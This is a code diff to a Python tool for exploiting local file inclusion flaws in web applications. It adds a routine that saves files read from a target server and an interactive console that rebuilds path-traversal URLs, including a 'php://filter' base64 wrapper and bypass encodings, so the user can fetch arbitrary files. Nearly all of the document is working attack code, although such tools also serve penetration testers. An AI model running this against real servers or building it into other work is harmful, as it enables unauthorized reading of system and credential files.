@@ -14,11 +14,12 @@ import mutation
 import exrex
 import re
 import base64
+import readline
 # This is necessary for disabling the 'verify=False' warning:
 import urllib3
 urllib3.disable_warnings()
 
-version_number = '2.1.0'
+version_number = '2.2.0'
 
 #
 # NOTE TO SELF
@@ -561,6 +562,8 @@ def process_urls(job_queue, exit_on_success=False, ignore_filters=False, show_re
                     if job['filepath'] not in successes:
                         successes[job['filepath']] = []
                     successes[job['filepath']].append(job)
+                    # Attempt to write the file
+                    dump_response(resp, job['filepath'])
                     if exit_on_success:
                         exit_flag = True
                     if show_results:
@@ -595,6 +598,74 @@ def show_result(job):
             print(f"[+] {lfi:<60}")
         else:
             print(f"{colors.GREEN}[+] {lfi:<60}{colors.END}")
+            
+
+def dump_response(resp, job_filepath):
+    # Create the output directory if it doesn't exist
+    output_dir = os.path.join(os.getcwd(), "output")
+    try:
+        os.makedirs(output_dir)
+    except FileExistsError:
+        pass
+    # Replace slashes in the filepath with hyphens
+    filename = job_filepath.replace("/", "-").replace("\\", "-")
+    if filename.startswith('-'):
+        filename = filename[1:]
+    output_path = os.path.join(output_dir, filename)
+    try:
+        with open(output_path, "wb") as f:
+            f.write(resp.content)
+    except PermissionError:
+        print(f"Permission denied: {output_path}")
+        return False
+    return True
+    
+
+def lfi_console(example_lfi):
+    # Figure out how to reconstruct the provided LFI, but using other filepaths instead.
+    example_job = parse_lfi_url(example_lfi)
+    slash = '/' if example_job['leading_slash'] else ''
+    method = args.request_type.upper()
+    
+    def remove_non_alphanumeric_prefix(s):
+        return re.sub(r'^[./\\]*|(?<=[^a-zA-Z0-9])[./\\]+', '', s)
+    
+    if args.colorless:
+        print(f'\n(At any time, type "exit" to stop)')
+    else:
+        print(f'\n(At any time, type {colors.BOLD}{colors.CYAN}"exit"{colors.END} to stop)')
+    while True:
+        try:
+            resource = input("\nTry to access a filepath:\n>> ")
+            if resource.upper() == "EXIT":
+                break
+            if readline.get_history_item(readline.get_current_history_length() - 1) == resource:
+                print(resource)
+            # Assemble a new Job based on the provided resource
+            f = {"path": resource}
+            job = assemble_job(f, slash, example_job['traversal'], example_job['ending'], example_job['depth'], example_job['mutation'], example_job['bypass'], False)
+            url = job['url']
+            resp = make_request(method, url, request_cookie, request_headers, request_data)
+            if (resp is not None) and matches(resp, url):
+                if args.colorless:
+                    print("[+] Seems like there's a file there. Saving response to file.")
+                else:
+                    print(f"{colors.GREEN}[+] Seems like there's a file there. Saving response to file.{colors.END}")
+                dump_response(resp, remove_non_alphanumeric_prefix(resource))
+            else:
+                print("Response was successful, but empty")
+        except KeyboardInterrupt:
+            break
+    print("Exiting...")
+    sys.exit(0)
+
+
+def ask_about_lfi_console():
+    s = input('\nWould you like to request files via the console? [y/N]\n>> ')
+    if s.upper() != 'Y':
+        print('OK. Exiting now.')
+        return False
+    return True
 
 
 def signalHandler(signum, frame):
@@ -1003,10 +1074,7 @@ def parse_lfi_url(successful_example_lfi):
     return None
 
 
-def enum(example_job):
-    """
-    Perform enumeration mode. Start with an example URL and figure out what traversal, encoding, and bypass was used
-    """
+def check_example_job(example_job):
     if example_job is None:
         if args.colorless:
             print(f"{' '*64}\n[-] No LFI parameters were found that successfully reproduce the provided \"example-lfi\":\n\n"
@@ -1019,48 +1087,53 @@ def enum(example_job):
                 f"{colors.END}    {args.example_lfi}\n\n"
                 f"{colors.RED}Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
                 f"for one of the files already defined in file-list.json\n{colors.END}")
-        sys.exit(1)
-
+        return False
     if args.verbose:
         parsed_job_text = json.dumps(example_job, sort_keys=True, indent='    ')
         print(f'Example job was parsed as the following:\n{parsed_job_text}')
+    return True
+    
+    
+def assemble_job(f, _slash, _traversal, _ending, _depth, _mutation_func_name, _bypass_func_name, use_php_base64=False):
+    _filepath = f['path']
+    if _filepath.startswith('/') and len(_filepath) > 1 and _depth > 0:
+        _filepath = _filepath[1:]
+    _base_resource = f'{_slash}{_depth * _traversal}{_filepath}{_ending}'
+    if use_php_base64:
+        php_b64 = 'php://filter/convert.base64-encode/resource='
+        _base_resource = f'{php_b64}{_depth * _traversal}{_filepath}{_ending}'
+    _mut = find_first(mutations, lambda m: m.__name__ == _mutation_func_name)
+    _byp = find_first(bypasses, lambda b: b.__name__ == _bypass_func_name)
+    if not _mut or not _byp:
+        print(f'Failed to look up mutation or bypass by name. '
+              f'Mutation: {_mutation_func_name}  Bypass: {_bypass_func_name}')
+    _url = args.url + _byp(_mut(_base_resource))
+    _job = {
+        "filepath": f['path'],
+        "traversal": _traversal,
+        "depth": _depth,
+        "leading_slash": (_slash == '/'),
+        "ending": _ending,
+        "mutation": _mut.__name__,
+        "bypass": _byp.__name__,
+        "url": _url,
+        "idx": -1
+    }
+    if use_php_base64:
+        _job['expect_base64'] = 1
+    return _job
+    
+
+def find_first(iterable, predicate):
+    return next((item for item in iterable if predicate(item)), None)
 
 
-
-    # Should try all files without variables then all the files with variables
-    # There should also be accommodations for PHP files
-
-    def find_first(iterable, predicate):
-        return next((item for item in iterable if predicate(item)), None)
-
-    def assemble_job(f, _slash, _traversal, _ending, _depth, _mutation_func_name, _bypass_func_name, use_php_base64=False):
-        _filepath = f['path']
-        if _filepath.startswith('/') and len(_filepath) > 1 and _depth > 0:
-            _filepath = _filepath[1:]
-        _base_resource = f'{_slash}{_depth * _traversal}{_filepath}{_ending}'
-        if use_php_base64:
-            php_b64 = 'php://filter/convert.base64-encode/resource='
-            _base_resource = f'{php_b64}{_depth * _traversal}{_filepath}{_ending}'
-        _mut = find_first(mutations, lambda m: m.__name__ == _mutation_func_name)
-        _byp = find_first(bypasses, lambda b: b.__name__ == _bypass_func_name)
-        if not _mut or not _byp:
-            print(f'Failed to look up mutation or bypass by name. '
-                  f'Mutation: {_mutation_func_name}  Bypass: {_bypass_func_name}')
-        _url = args.url + _byp(_mut(_base_resource))
-        _job = {
-            "filepath": f['path'],
-            "traversal": _traversal,
-            "depth": _depth,
-            "leading_slash": (_slash == '/'),
-            "ending": _ending,
-            "mutation": _mut.__name__,
-            "bypass": _byp.__name__,
-            "url": _url,
-            "idx": -1
-        }
-        if use_php_base64:
-            _job['expect_base64'] = 1
-        return _job
+def enum(example_job):
+    """
+    Perform enumeration mode. Start with an example URL and figure out what traversal, encoding, and bypass was used
+    """
+    if not check_example_job(example_job):
+        sys.exit(1)
 
     # Create a queue of requests to make
     job_queue = queue.Queue()
@@ -1308,6 +1381,8 @@ def main():
         elapsed = end_time - start_time
         print(f"\nEnumeration complete: {n} requests in {elapsed:.1f}s ({n / elapsed:.0f} req/s)")
         enum_report()
+        if ask_about_lfi_console():
+            lfi_console(args.example_lfi)
 
     if args.mode == "batch":
         print('TODO: I haven\'t written \"batch\" mode yet! Please run it in filter mode, then scan mode, then enum mode.')
